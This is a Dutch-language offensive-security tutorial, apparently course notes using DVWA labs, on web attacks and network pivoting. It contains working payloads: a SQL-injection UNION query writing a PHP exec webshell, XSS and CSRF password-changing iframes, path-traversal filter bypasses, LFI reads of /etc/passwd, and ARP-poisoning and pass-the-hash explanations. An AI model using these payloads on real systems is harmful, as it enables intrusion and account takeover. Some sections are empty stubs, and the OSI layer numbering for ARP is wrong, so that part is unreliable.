<p>allereerst gaan wij kijken of deze pagina überhaupt kwetsbaar is voor een SQL injectie. Wij gebruiken hiervoor een simpel testje, namelijk:</p>
<pre><code>1 OR 1=1
</code></pre>

<p>Als het goed is zie je weer gewoon de inhoud van de eerste pagina. Als de query niet kwetsbaar was geweest bleef je pagina leeg of zag je een foutmelding.</p>
<p>Bij een union select injectie is het van belang dat er net zo veel kolommen opgevraagd worden uit de database als oorspronkelijk al het geval was in de query. Ook moet je zorgen dat er uit de oorspronkelijke query geen enkel resultaat meer terug gegeven wordt.</p>
<p>De makkelijkste manier om te zorgen dat je geen resultaat terug krijgt bij een query met een numerieke ID als beperkende factor is die met het ID -1 selecteren. Als je als paginanummer -1 invoert zul je zien dat de pagina leeg blijft.</p>
<p>Alhoewel je nu natuurlijk al weet hoeveel kolommen je moet selecteren gaan wij toch proberen te achterhalen hoeveel het er moeten zijn. Na de -1 typen we nu UNION SELECT 1. Je krijgt dan de volgende injectie:</p>
<pre><code>-1 UNION SELECT 1
</code></pre>

<p>Als het goed is zie je of een foutmelding, of je pagina blijft leeg.</p>
<p>Als we dan de volgende selectie opgeven:</p>
<pre><code>-1 UNION SELECT 1,2
</code></pre>

<p>dan zie je als het goed is in de titel het getal 1, en in de inhoud het getal 2. </p>
<p>Als je nu wilt weten welke tabellen er allemaal op de database server bestaan dan kun je kijken in de MySQL systeem database information_schema en dan in de tabel table. Hierin staan de kolomnamen table_schema en table_name. Probeer de volgende query maar eens in phpmyadmin:</p>
<pre><code>SELECT table_schema, table_name FROM information_schema.table
</code></pre>

<p>Doormidden van group_concat en concat kan je vervolgens deze velden in 1 kolom stoppen.</p>
<p>Als we terug gaan naar onze union select injectie kunnen wij de volgende query ervan maken:</p>
<p><code>-1 UNION SELECT 1, GROUP_CONCAT(concat('table_schema'.'table_name'), '-') FROM information_schema.table # --</code> </p>
<p>Zie in de inhoud nu alle tabellen verschijnen.</p>
<h3>Van SQL injectie naar Webshell</h3>
<p>Als wij het bovenstaande codevoorbeeld weer pakken:</p>
<pre><code>&lt;?PHP
    $pagina = 0;
    if (isset($_GET['pagina']))
    {
        $pagina = $_GET['pagina'];
    }

    $rPagina = mysqli_query($db, &quot;SELECT titel, inhoud FROM paginas WHERE id=&quot;.$_GET['pagina'].&quot; LIMIT 1&quot;);
    if (mysqli_num_rows($rPagina) &gt; 0)
    {
        $aPagina = mysqli_fetch_assoc($rPagina);

        echo &quot;
            &lt;h1&gt;&quot;.$aPagina['titel'].&quot;&lt;/h1&gt;
            &quot;.$aPagina['inhoud'];
    }
?&gt;
</code></pre>

<p>Zoals wij eerder gezien hebben kan je dan gegevens opvragen, maar sommige SQL accounts hebben ook toegang tot de <a href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html">SELECT ... INTO</a> syntax. Je webapplicatie moet wel schrijfrechten hebben op de plaats waar je een bestand wilt wegschrijven. Denk dan aan logische locaties zoals /tmp (heb je wel een LFI nodig) of in een directory van de webserver. Ook mappen waar de website sowieso file uploads opslaat zijn goede locaties.</p>
<p>Een voorbeeld van een injectie die je dan kan doen is als volgt:</p>
<p><code>-1 UNION SELECT 1, '&lt;?PHP $return = array(); exec($_GET['c'],$return); echo implode(&quot;\n&quot;,$return); ?&gt;' INTO OUTFILE '/var/www/html/shell.php' # --</code></p>
<p>Als je dan op de webserver de file shell.php opvraagt met als querystring c=ls dan zal je de directory listing zien van de /var/www/html map.  </p>
<h2>Client-side controle functionaliteiten</h2>
<h3>Authenticatiefouten</h3>
<h3>Sessie management</h3>
<p>Veel webapplicaties maken gebruik van sessies om de gebruikerservaring te verbeteren. In dit soort sessies worden bijvoorbeeld de gebruikersgegevens over authenticatie en identificatie opgeslagen. Hiermee kan een website bepalen tegen welke gebruiker hij praat en of deze gebruiker al dan niet ingelogged is. </p>
<p>De identifiers van deze sessies worden in een cookie opgeslagen. Deze gegevens moeten met elke pagina refresh meegezonden worden omdat een HTTP request in zichzelf stateless is.</p>
<p>In PHP heten deze session, standaard, cookies PHPSESSIONID en in Java JSESSIONID.</p>
<p>Als je door middel van, bijvoorbeeld, XSS de session id's kan stelen is het in sommige webapplicaties mogelijk om jezelf voor te doen als een andere gebruiker. Krijg je zo de cookies van een administrator te pakken, dan kan je de gehele website overnemen.</p>
<h3>NoSQL</h3>
<h3>CSP Bypass</h3>
<h3>XPath</h3>
<h3>LDAP</h3>
<h3>Verborgen formuliervelden</h3>
<p>Sommige developers gaan er van uit dat verborgen velden in formulieren ook echt verborgen zijn voor een eindgebruiker, maar elke eindgebruiker kan natuurlijk de page source opvragen. Je kan een verborgen veld in een formulier zelf eenvoudig aanpasbaar maken met de inspector/debugging functionaliteiten van je browser of door zelf een nieuw formulier te maken.</p>
<p>Als de developer de denkfout gemaakt heeft dat een verborgen formulier nooit gezien zal worden door een eindgebruiker, is het niet ondenkbaar dat er ook geen filtering en beveiliging plaats vind op de invoer uit deze velden.</p>
<h3>File uploads</h3>
<h4>HTML verificatie</h4>
<p>File uploads zijn een prachtige gelegenheid om je eigen (al dan niet uitvoerbare) code op een webserver te krijgen. Soms is er gebruik gemaakt van een perfecte implementatie waarbij je alleen afbeeldingen kan uploaden, in andere gevallen is er ergens een foutje gemaakt in de logica. De verificatie van bestanden die iemand wil uploaden kan client-side of server-side plaatsvinden. Een van de voorbeelden van client-side verificatie is de HTML accept attribute.</p>
<p>Bij een input tag met als type attribute file kan een developer ook een accept attribute opgeven. In deze accept attribute kan hij de <a href="https://en.wikipedia.org/wiki/Media_type#mime.types">MIME types</a> of de file extensies opgeven. </p>
<pre><code>&lt;input type=&quot;file&quot; accept=&quot;.png,.jpg,.jpeg,.gif&quot; /&gt;
</code></pre>

<p>of </p>
<pre><code>&lt;input type=&quot;file&quot; accept=&quot;image/jpeg&quot; /&gt;
</code></pre>

<p>of </p>
<pre><code>&lt;input type=&quot;file&quot; accept=&quot;image/*&quot; /&gt;
</code></pre>

<p>Een kwaadwillende bezoeker kan dit formulier kopiëren en naar zijn eigen hand zetten door de accept attribute te verwijderen. Als er geen vorm van filetype verificatie plaats vind, dan upload je zonder enige problemen je bestand. Op deze manier kan je bijna elke client-side upload beveiliging omzeilen. Javascript is immers ook uit te schakelen, danwel met een eigen implementatie alsnog te misbruiken.</p>
<h4>strpos</h4>
<p>Als er wel gebruik is gemaakt van een server-side script om de file verificatie te doen, dan is strpos bijna de slechtste. Soms zie je dat een developer de volgende code gebruikt om te verifiëren of een filetype op de whitelist staat.</p>
<pre><code>&lt;?PHP
    $extensions = array('.gif','.jpg','.png','.jpeg');
    $filename = $_FILES['upload']['name'];

    $valid = 0;
    foreach ($extensions AS $extension)
    {
        if (strpos($filename,$extension) !== false)
        {
            $valid = 1;
        }
    }

    if ($valid !== 1)
    {
        die(&quot;Please upload an image!&quot;);
    } 
?&gt;
</code></pre>

<p>Alhoewel dit script het bestand plaatje.png keurig door zal laten en het bestand 3v1l_sh3ll.php keurig zal weigeren, zit er toch een klein foutje in. Dit foutje is ontstaan doordat gebruik is gemaakt van de functie <a href="http://php.net/strpos">strpos</a>. De functie strpos zoekt de eerste positie van een needle ($extension) in de gehele haystack ($filename). Mocht je nu een bestand uploaden met de naam 3v1l_1mag3.jpg.php dan zal het script bovenin beginnen met uitvoeren en na eerst op de string .gif gecontroleerd te hebben zal hij al snel door springen naar de .jpg string. Deze zit in onze bestandsnaam en dus geeft hij de aanvangspositie (10) terug.</p>
<p>Omdat er een aanvangspositie is, geeft strpos geen false terug en is valid voorzien van de waarde 1. Uw shell kan nu ge-upload worden. Wat altijd van belang is, is dat de extensie er een is die door de webserver ook daadwerkelijk met de juiste taal geparsed zal worden.  </p>
<h4>Meegezonden MIME type</h4>
<p>Browsers sturen bij een file upload vaak de mime type van het geuploade bestand mee. In het volgende demoscript is dit het geval:</p>
<pre><code>&lt;?PHP
    $mimetypes = array('image/gif','image/jpg','image/png','image/jpeg');
    $mimetype = $_FILES['upload']['mime'];

    $valid = 0;
    if (in_array($mimetype,$mimetypes) !== false)
    {
        $valid = 1;
    }

    if ($valid !== 1)
    {
        die(&quot;Please upload an image!&quot;);
    } 
?&gt;
</code></pre>

<p>Als je dit script bekijkt zul je zo snel geen kwetsbaarheden zien, dat komt omdat er in het script zelf geen kwetsbaarheden zitten. Alhoewel het voor de eindgebruiker niet zichtbaar is stuurt de browser het MIME type mee met een file upload. Dit script is dus eigenlijk gebaseerd op client input. Als je je request door een proxy server als burp suite haalt, hem intercept en vervolgens het MIME type aanpast, dan zal je zien dat je upload gaat werken.</p>
<p><strong>Insert hier uitleg met curl en firefox :D</strong></p>
<h3>Fouten in de logica</h3>
<h4>PHP Redirects</h4>
<p>In PHP gebruikt men vaak HTTP headers om redirections te doen.</p>
<pre><code>&lt;?PHP
    if ($loggedin == 0)
    {
        header(&quot;Location: /&quot;);
    }
    echo &quot;Geheimen&quot;;
?&gt;
</code></pre>

<p>Alhoewel in dit voorbeeld de header voor de HTTP redirect al wel verzonden is, gaat de script uitvoer wel door. Je kan dan, als je de redirect voorkomt, alsnog alles onder de redirect lezen. Er zijn plugins voor browsers die je hiervoor kan gebruiken, zoals de <a href="https://addons.mozilla.org/nl/firefox/addon/noredirect/" title="Firefox addon noredirect.">https://addons.mozilla.org/nl/firefox/addon/noredirect/</a>. Na een redirect dient de execution altijd gestaakt te worden met een exit of een die.</p>
<h3>Cross site scripting</h3>
<p>Cross site scripting (XSS) is een techniek waarbij je “slechte” gebruikersinvoer kunt plaatsen op een website. Deze invoer kan je vervolgens gebruiken om mensen te besmetten of om hun cookies / credentials te stelen. </p>
<p>Sommige browsers zoals Chrome en Internet Explorer &gt;8.0 geven een foutmelding op het moment dat je XSS wilt uitvoeren. </p>
<p>Als mensen op een plaats HTML gebruiken om inhoud weer te geven, zoals bij sommige messenger applicaties e.d., dan kan het ook zomaar zijn dat er een browser gebruikt is om dit weer te geven. Browsers voeren javascript uit, en derhalve kan je zomaar gebruik maken van XSS in andere applicaties dan browsers. </p>
<h4>Reflected XSS</h4>
<p>Reflected of non-persistent XSS is een techniek waarbij een fout in de input sanitization het weergeven van kwaadaardige code toe staat. Het belangrijkste om te onthouden is dat in dit geval de aanval niet op de website opgeslagen is, en iemand dus alleen slachtoffer kan worden als hij echt jouw link aan klikt met de aanval.</p>
<h4>PHP voorbeeld Reflected XSS</h4>
<p>Het volgende code voorbeeld is kwetsbaar voor XSS </p>
<pre><code>&lt;?PHP
    if (isset($_GET['status']))
    {
        echo $_GET['status'];
    }
?&gt;
</code></pre>

<p>Als je dit in een php pagina zet, en deze PHP pagina bezoekt met als <a href="https://nl.wikipedia.org/wiki/Querystring">querystring</a> status=%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E zie je het volgende:</p>
<p><img src="images/reflective_xss.png" /> </p>
<p><strong>Let op!</strong> de waarden zijn urlencoded om geen verstoring in de URL te geven. </p>
<h4>Stored XSS</h4>
<p>Stored of persistent XSS is een techniek waarbij een fout in de input sanitization het opslaan van je aanval mogelijk maakt. Dit soort aanvallen maken meer slachtoffers omdat iedereen die de specifieke pagina bezoekt er mee besmet zal worden.</p>
<p><strong>DVWS voorbeeld</strong>
<img src="images/xss_stored_alertxss.png" />
<img src="images/xss_stored_alertxss_result.png" /></p>
<h4>DOM XSS</h4>
<p>DOM (Document Object Model) XSS is een methode waarbij een aanvaller de kwaadaardige code op zo een manier plaatst dat het nooit via de webserver loopt. Dit kan bijvoorbeeld als <a href="https://nl.wikipedia.org/wiki/JavaScript">javascript</a> gebruik maakt van de URL van een webpagina zonder hierop een juiste input sanitization te doen.</p>
<h2>Local file inclusion</h2>
<p>LFI is een aanvalstechniek die volledig Local File Inclusion heet. Het is een kwetsbaarheid waarbij een applicatie gebruikersinvoer niet op een juiste wijze bewerkt. Door deze kwetsbaarheid te misbruiken krijg je de mogelijkheid om bestanden in te laden waar dit (eigenlijk) niet de bedoeling was. Op deze manier kan je potentieel bestanden lezen als /etc/passwd of andere gevoelige bestanden.</p>
<p>File includes zijn redelijk te herkennen aan de parameters achter een pagina naam. Denk hierbij aan een GET parameter als file of page. Vaak zie je hier dan een bestandsnaam staan. In de submappen zijn enkele opdrachten te vinden waarmee je zelf met LFI kunt spelen.</p>
<h2>Path traversal</h2>
<p>Path Traversal wordt ook wel Directory Traversal genoemd. Eigenlijk is dit niets anders dan in een regulier Linux filesystem navigeren. Als je iets in een andere map wilt zoeken zul je hier naar toe moeten navigeren op een manier zoals je dat op de command line ook doet. Als je test.txt wilt weergeven die een map hoger in de directory structuur staat kan je “cat ../test.txt” gebruiken.</p>
<p>Je kan op deze manier geen sources van PHP bestanden in zien. PHP bestanden worden door de PHP functies <a href="https://www.php.net/include">include</a> en <a href="https://www.php.net/require">require</a> ingeladen en geparsed. Hierdoor zal je hetzelfde zien als wat je ziet als je de pagina rechtstreeks bezoekt.</p>
<p>In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path's op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. Wil je een inclusion mogelijkheid vinden dan is het altijd handig om in de querystrings te kijken naar keys die namen hebben als file, dir of path. Vaak gaat het dan om alfanumerieke waarden, maar dit hoeft niet altijd zo te zijn! Meestal is het handigst om even in de page source in je browser te kijken.</p>
<p>Om bepaalde filters te omzeilen kan je bijvoorbeeld je path url encoden of tweemaal url encoden. Dit geeft in die volgorde de volgende resultaten:</p>
<pre><code>../
%2e%2e%2f
%252e%252e%252f
</code></pre>

<p>Ook kan je je path traversal in unicode opgeven uit de hoop dat een ontvangende applicatie hier niet correct mee om kan gaan. In sommige gevallen filteren scripts op <em>../</em> . Je kan dan ook eens een andere slash gebruiken dan die je net gebruikte. </p>
<p>Mochten ze onverhoopt ../ en ..\ er uit filteren zoals in het volgende code voorbeeld:</p>
<pre><code>&lt;?PHP
    $path = $_GET['path'];
    $path = ereg_replace('\.\./','',$path);
    $path = ereg_replace('\.\./','',$path);
    echo $path;
?&gt;
</code></pre>

<p>Dan kan je bijvoorbeeld de volgende string opgeven:</p>
<pre><code>...\.\
</code></pre>

<p>PHP zal in dat geval eerst de ..\ er uit filteren, en dan houd je alsnog een correcte path traversal over. </p>
<h3>Simpele beveiliging</h3>
<p>In sommige gevallen proberen developers een local file inclusion te voorkomen door bijvoorbeeld een extensie op te geven in hun include. Op deze manier kunnen ze voorkomen dat je bijvoorbeeld /etc/passwd uit kan lezen, omdat /etc/passwd.php niet bestaat.</p>
<p>In programmeertalen worden strings meestal beëindigd met een zogenaamde <a href="https://en.wikipedia.org/wiki/Null_character">null-byte</a>. Een null-byte is hexadecimaal 0x00 en heeft geen teken om hem weer te geven. Als je zelf een null-byte kan injecten in deze file, dan kan je potentieel voorkomen dat de extensie er achter geplakt wordt. </p>
<p>Als het je niet lukte dan kan dit komen omdat je je URL niet correct ge-encode hebt. Een nullbyte kan je niet zomaar meesturen, maar moet door de webserver wel correct geïnterpreteerd worden. Stuur dus %00 mee in plaats van 0x00 of 0. De nullbyte methode werkt enkel in PHP &lt; 5.3.</p>
<p>In filesystem functies trunct PHP onder linux de paden automatisch naar 4096 tekens. Je kan dit voor elkaar krijgen door voor het path een opstapeling van “./” strings op te nemen totdat je op dit maximum zit.</p>
<h3>LFI naar RCE via Log bestanden</h3>
<p>Je kan met logbestanden potentieel RCE verkrijgen. Als je nieuwsgierig bent kan je de logbestanden in /var/log zelf bekijken en zien welke log bestanden je hiervoor zal kunnen misbruiken. Als je iets in een log bestand weet weg te schrijven kan je vervolgens het bestand includen en je code laten uitvoeren.</p>
<h3>PHP Wrapper</h3>
<p>PHP kent verschillende wrappers. Met <a href="http://php.net/manual/en/wrappers.php.php">PHP Wrappers</a> kan je toegang krijgen tot diverse I/O streams van applicaties en op deze wijze kan je bestanden uitlezen of commando’s op servers uitvoeren. Deze wrappers zijn voornamelijk bedoeld om met functies als readfile, file en file_get_contents te werken. </p>
<h4>php://data</h4>
<h4>php://stdin, php://stdout en php://stderr</h4>
<h4>php://input</h4>
<p>De php://input wrapper voert altijd de complete inhoud van een POST request uit. Deze inhoud zal uitgevoerd worden zonder dat het door PHP, en de instellingen in php.ini, geparsed zijn. Hierdoor kan je commando’s op de server uitvoeren.</p>
<p>Installeer vervolgens de Firefox <a href="https://addons.mozilla.org/nl/firefox/addon/hackbar/">Hackbar</a> op je lokale machine. Met de Hackbar kan je vervolgens POST verzoeken sturen naar de webserver en pagina.php met als url: <jeurl>/pagina.php?file=php://input</p>
<h4>php://output</h4>
<h4>php://fd</h4>
<h4>php://memory en php://temp</h4>
<h4>php://filter</h4>
<p>In sommige gevallen kan je enkel gebruik maken van <a href="http://php.net/manual/en/filters.php">filters</a> om informatie uit te lezen. </p>
<p>De syntax van filters is als volgt:</p>
<pre><code>php://filter/&lt;type&gt;.&lt;filter&gt;/&lt;parameter&gt;
</code></pre>

<p>Wil je een bestand uitlezen en deze base64 gecodeerd weergeven dan kun je het volgende gebruiken. </p>
<pre><code>php://filter/convert.base64-encode/resource=../../../etc/passwd
</code></pre>

<h3>Zelf bestanden introduceren</h3>
<p>Je kan zelf bestanden introduceren door middel van bijvoorbeeld upload formulieren. Op foto deel websites kan je een foto uploaden maar geen PHP bestanden. Je kan PHP code opnemen in de meta data van een afbeelding en deze via LFI kwetsbaarheid laten uitvoeren.</p>
<h3>Handige systeembestanden</h3>
<p>Er bestaan systeembestanden die te misbruiken zijn als je de juiste invoer gebruikt. Dit zijn voornamelijk bestanden in de /proc/self mappen van Linux.
Dit zijn specifieker:</p>
<h4>/proc/self/cmdline</h4>
<h4>/proc/self/stat</h4>
<h4>/proc/self/fd/[0-35]</h4>
<p>In een van de filedescriptors van het huidige proces staat de Apache error log weggeschreven. Je kan zelf php code in de logging wegschrijven en deze later weer opvragen.</p>
<p><img src="http://gatochhacken.nl/images/lfi_file_fd_errorlog.png" /></p>
<h4>/proc/self/environ</h4>
<p>Als je de environ file kan includen dan heb je de beschikking over de environmental variabelen waaronder de applicatie op dat moment draait. Een van de gebruikersgegevens die in deze environmental variabelen terecht komt is de user agent. Doormiddel van handige Firefox plugin zoals <a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">uaswitcher</a> kan je zelf je useragent aanpassen en hier bijvoorbeeld PHP code in plaatsen. </p>
<h3>Cross Site Request Forgery</h3>
<p>Cross Site Request Forgery of CSRF is een methode waarbij je gebruikers een actie kan laten uitvoeren zonder dat ze dit door hebben. In DVWA kan je dit zelf uitproberen, en ook bij CS zul je mogelijkheden vinden om dit te beoefenen.</p>
<p>Het simpelste voorbeeld uit DVWA is het aanpassen van je wachtwoord. Het formulier is naar de website toegestuurd in de querystring en er is geen mogelijkheid toegevoegd om te verifieren of die wel echt de actie van een ingelogde gebruiker was. Met het volgende code snippet zou je (als je ook XSS toegang hebt) eenvoudig elke langs surfende gebruiker zijn wachtwoord op de website kunnen aanpassen:</p>
<p><code>&lt;iframe src=&quot;http://&lt;dvwa adres&gt;/vulnerabilities/csrf/?password_new=qwerty&amp;password_conf=qwerty&amp;Change=Change#&quot; style=&quot;width:0px;height:0px;&gt;</code></p>
<p>Elke gebruiker zal met de onzichtbare <a href="https://www.w3schools.com/tags/tag_iframe.asp">iframe</a> automatisch de password vervang pagina aanroepen en het nieuwe wachtwoord qwerty instellen. </p>
<h1>Netwerk aanvallen</h1>
<h2>Enumeratie</h2>
<p>Ook op netwerken is het erg belangrijk om een juiste enumeratie te doen. Het weten welke hosts er in het netwerk zijn en welke hosts er allemaal beschikbaar zijn om aan te vallen is één van de belangrijkste gegevens.</p>
<p>Bij het uitvoeren van een red team actie is het van belang dat het red team een zekere opbouw in &quot;detecteerbaarheid&quot; heeft. Immers het is de bedoeling dat het red team op een gegeven moment gedetecteerd wordt door het blue team om op deze wijze ook de incident response te kunnen testen.</p>
<h3>Passive host discovery</h3>
<p>Er zijn diverse manieren om hosts op een netwerk te ontdekken, je kan actief scannen maar ook passief ontdekken welke systemen aanwezig zijn. Dit ontdekken zonder zelf activiteit in het netwerk te veroorzaken zal logischerwijs minder opvallen. Je kan met TCPdump een netwerkdump maken en deze in wireshark openen. Kijk naar alle binnenkomende ARP antwoorden en maak een lijstje van alle IP adressen die je voorbij ziet komen. Je kan, afhankelijk van de data die je binnenkrijgt natuurlijk ook andere protocollen dan ARP meenemen in dit lijstje.</p>
<p>Dit kun je ook eenvoudiger maken met de tool netdiscover en de schakeloptie -p.</p>
<h3>Actieve host discovery</h3>
<h4>Ping sweep</h4>
<p>Een ping sweep is iets wat in gemonitorde omgevingen waarschijnlijk op zal vallen en het zal alleen werken als er geen ICMP filtering is geïmplementeerd. ICMP filtering voorkomt immers dat een host op een PING verzoek kan reageren.</p>
<p>Probeer zelf een programma te schrijven die het ICMP Ping pakket verzend, of gebruik nmap -sP <ipange> om het IP adres van je home lab server te vinden.</p>
<h3>Port scan</h3>
<p>nmap -p <ports> <ip></p>
<h2>ARP poisoning</h2>
<p>Een van de manieren om een man in the middle positie te bemachtigen is ARP poisoning. ARP staat voor Address Resolution Protocol. Om de werking van ARP op een goede manier te begrijpen is het noodzakelijk om het OSI model te snappen. Voor het OSI model verwijs ik terug naar het &quot;protocollen&quot; kopje.</p>
<p>Het ARP protocol (laag 6) zorgt ervoor dat de computers binnen een IP subnet (laag 5) van elkaar kunnen weten aan welk MAC adres men een frame moet zenden. Als voorbeeld hebben wij een netwerk met de volgende systemen:</p>
<p>Hostnaam   - IP Adres	 - MAC adres
Computer A - 192.168.1.2 - MACADDR1
Computer B - 192.168.1.3 - MACADDR2</p>
<p>Op het moment dat computer A een berichtje wil sturen naar computer B zal computer A zowel het IP adres als het MAC adres van computer B weten. Het IP adres is ingegeven door de gebruiker, met dat IP adres stuurt computer A een ARP verzoek.</p>
<blockquote>
<p>Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!</p>
</blockquote>
<p>Dit bericht wordt op laag 7 opgevangen door de computers op het subnet. Elke computer gaat in zijn OSI model omhoog vragen of het IP adres bij hem hoort. Laag 7 vraagt aan laag 6, laag 6 aan laag 5 en daar komt computer B erachter dat dit MAC adres van hem is. Computer B stuurt deze bevestiging terug naar laag 6, die weer naar laag 7 en dan wordt er op het netwerk het volgende ARP bericht verzonden:</p>
<blockquote>
<p>192.168.1.3 is te vinden op MACADDR2</p>
</blockquote>
<p>Op dat moment weet computer A het juiste MAC adres en kan computer A het pakketje versturen.</p>
<p>Bij ARP poisoning komen wij op computer C om de hoek.
Hostnaam   - IP Adres	 - MAC adres
Computer A - 192.168.1.2 - MACADDR1
Computer B - 192.168.1.3 - MACADDR2
Computer C - 192.168.1.4 - EVILMAC1</p>
<p>Computer A vraagt weer in het netwerk:</p>
<blockquote>
<p>Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!</p>
</blockquote>
<p>maar het is nu niet computer B die als eerste kan reageren, maar dat zijn wij op computer C. Op het moment dat wij het verzoek van computer A zien sturen wij zo snel (en vaak) mogelijk naar het MAC adres van computer A:</p>
<blockquote>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
</blockquote>
<p>en als wij eerder zijn dan de reactie van computer B dan wordt het bericht naar ons verzonden, ditzelfde doen wij ook zo snel mogelijk voor het pad van computer B naar computer A. Wij sturen op het netwerk ook zo vaak en snel mogelijk</p>
<blockquote>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
<p>192.168.1.3 is te vinden op EVILMAC1</p>
</blockquote>
<p>naar het MAC adres van computer A. Op onze eigen computer zorgen wij ervoor dat wij de binnengekomen pakketten ook opnieuw verzenden naar de goede computer zodat het netwerk blijft draaien, en je hebt een Man in the Middle positie bemachtigd.</p>
<p>Tooling: Arpspoof, ettercap, bettercap </p>
<h2>Pass the hash</h2>
<p>In Windows domeinen kan er gebruikt worden van NTLM (NT Lan Manager) authenticatie. Dit is een authenticatiemethode die gebruikt maakt van het HTTP protocol om een single sign-on mogelijkheid te maken.</p>
<p>Bij pass the hash maak je gebruik van dit protocol om jezelf te authenticeren als een ander. Alhoewel wachtwoorden nooit ongehashed over het netwerk zullen gaan, en je dus niet zomaar als een ander kan inloggen als je naar zijn computer loopt, worden hashes wel over het netwerk verzonden. Aangezien een gebruiker zichzelf bij diensten (shares etc.) aanmeld met deze hash kan je die hergebruiken.</p>
<p>Geavanceerde hacktools om pash the hash mee te doen? PSExec <a href="https://docs.microsoft.com/en-us/sysinternals/">Windows Sysinternals</a> of de vergelijkbare variant van Metasploit. Let wel op, de ene variant laat eerder een virusscanner af gaan dan de ander.</p>
<h2>Pivoting</h2>
<h2>Iptables port forwarding</h2>
<p>Alhoewel mensen vaak denken dat de <a href="https://en.wikipedia.org/wiki/Iptables">iptables</a> alleen gebruikt kunnen worden om als firewall te dienen, kun je met iptables ook <a href="https://nl.wikipedia.org/wiki/Port_forwarding">port forwarding</a> toepassen. Dit doe je doormiddel van, onder andere, de prerouting chain. Hiermee kun je de packets die aan de rule voldoen aan laten passen, voordat ze verwerkt worden door het besturingssysteem. Dit doe je overigens wel door de iptables van de host waar je overheen wilt pivotten aan te passen.</p>
<pre><code>iptables -t nat -A PREROUTING -p tcp -d &lt; ServerIP &gt; --dport &lt; ServerPoort &gt; -j DNAT --to-destination &lt; EinddoelIP &gt;:&lt; EinddoelPort &gt;
</code></pre>

<p>Nu zal het je opvallen dat alhoewel jij wel pakketten naar de andere kant kan sturen, jij nooit pakketten terug zal krijgen. Dit komt omdat de computer nu wel pakketten ontvangt die voor jou bedoeld zijn, maar er niets mee kan. Denk aan het OSI model, het adres klopt niet dus hij dropt de gegevens zonder ze te behandelen!</p>
<p>Om dit te voorkomen gaan we de computer ook nog toestemming geven om pakketten die vanaf &lt; EinddoelIP &gt; met &lt; EinddoelPort &gt; komen door te sturen naar het doel wat opgegeven is, in dit geval meestal jij dus.  </p>
<pre><code>iptables -A FORWARD -p tcp -d &lt; EinddoelIP &gt; --dport &lt; EinddoelPort &gt; -j ACCEPT
</code></pre>

<p>**Let op: ** Controleer even of de netwerkadapter waar we over praten port forwarding toe staat:</p>
<pre><code>cat /proc/sys/net/ipv4/conf/&lt; netwerkadapter &gt;/forwarding
</code></pre>

<p>Zo niet, zet dan de waarde op 1. </p>
<p>Als je dit voor een webserver doet, kan je vervolgens gewoon naar http://&lt; ServerIP &gt;:&lt; ServerPoort &gt; surfen en dan zal je de pagina zien die op http://&lt; EinddoelIP &gt;:&lt; EinddoelPort &gt; draait.</p>
<p>Mocht dit niet werken kan je ook de volgende variant proberen, <strong>let op,</strong> deze verzorgt lokale forwarding.</p>
<pre><code>iptables -t nat -A PREROUTING -p tcp --destination-port &lt; oorspronkelijke port &gt; -j REDIRECT --to-ports &lt; nieuwe Port &gt;
</code></pre>

<h2>Meterpreter port forwarding</h2>
<p>Als je gebruik maakt van meterpreter als shell dan zijn er standaard mogelijkheden om portforwarding toe te passen. Hiervoor kan je het commando portfwd. Deze methode gebruik je als volgt:</p>
<pre><code>portfwd add -L &lt; lokale IP &gt; -l &lt; lokale poort &gt; -r &lt; remote IP &gt; -p &lt; remote poort &gt; 
</code></pre>

<p>Bij het lokale IP, gaat het om het IP adres van de machine waar je metasploit op hebt draaien. Je hoeft deze niet persé op te geven.</p>
<p>Wil je de portforward weer weghalen, dan gebruik je bijna hetzelfde commando als hierboven maar vervang je add voor delete.</p>
<p>Een overzicht van alle actieve portforwards kan je opvragen door het list argument mee te geven, alles verwijderen doe je met het flush argument:</p>
<pre><code>portfwd list
portfwd flush  
</code></pre>

<h2>SSH</h2>
<h3>Remote SSH port forwarding</h3>
<p>Een remote port forward kan je gebruiken als de server, die je onder controle hebt gekregen, dienst moet doen als pivot punt tussen jou en een andere server. Op deze manier kan je tussen twee netwerken hoppen waar je normaal geen toegang toe zou mogen hebben. Hierbij valt te denken aan een webserver met een aparte database server. Deze database server is door zijn iptables enkel toegestaan om met de webserver te communiceren. </p>
<pre><code>Jij:    10.8.0.1
Webserver: 192.168.1.1
Database:  192.168.1.2
</code></pre>

<p>Allereerst zul je op de webserver de sshd_config moeten aanpassen. In deze file moet je de optie GatewayPorts op yes zetten. en hierna zul je SSH moeten herstarten.</p>
<p>Nu kan je het volgende doen: </p>
<p>ssh -R 10.8.0.1:3306&#58;192.168.1.2:3306 192.168.1.1</p>
<p>In dit scenario zal elke verbinding afkomstig van 10.8.0.1 naar poort 3306 op 192.168.1.1 toegestaan worden, en geforward naar 192.168.1.2 poort 3306. <strong>Let op,</strong> doordat je in het begin je eigen IP adres hebt neergezet ben jij de enige die met deze poort kan connecten.</p>
<h3>Local SSH port forwarding</h3>
<p>Een lokale port forward kan je gebruiken om services die alleen op localhost luisteren (memcached, mysql etc.) te ontsluiten naar het internet. Dit kan handig zijn omdat je je tooling mogelijk niet op een externe server wilt plaatsen maar op deze manier je tooling wel kan gebruiken. <strong>Let op:</strong> je zet de service dan wel voor iedereen open, tenzij je hem expliciet bind aan een lokaal ip adres. </p>
<p>Als je op &lt; remoteHost &gt; de MySQL service wil laten luisteren op de TCP port 2000 kan je de volgende syntax gebruiken: </p>
<pre><code>ssh -L 2000:127.0.0.1:3306 &lt; remoteHost &gt;
</code></pre>

<p>Als je wil dat hij de packets enkel doorstuurt als je connect naar het IP adres 192.168.1.1, dan moet je er een bind socket van maken.</p>
<pre><code>ssh -L 192.168.1.1:2000:127.0.0.1:3306 &lt; remoteHost &gt;
</code></pre>

<h1>Binary exploitation</h1>
<h2>Backdooren van een executable</h2>
